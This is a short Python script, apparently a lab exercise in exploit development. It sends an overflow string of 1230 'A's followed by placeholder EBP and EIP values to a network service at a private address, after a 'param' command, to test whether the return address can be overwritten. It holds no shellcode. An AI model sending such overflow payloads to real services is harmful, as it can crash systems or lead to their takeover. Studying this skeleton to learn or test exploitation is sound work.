#!/usr/bin/python
import sys,socket
buffer='A'*1230
ebp='BBBB'
eip='CCCC'
stack = buffer + ebp + eip

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.0.2',1234))
	#s.recv(1024)
	s.send("param " + stack + "\r\n")
	s.recv(1024)
	s.close()
except:
	print("Cannot connect")
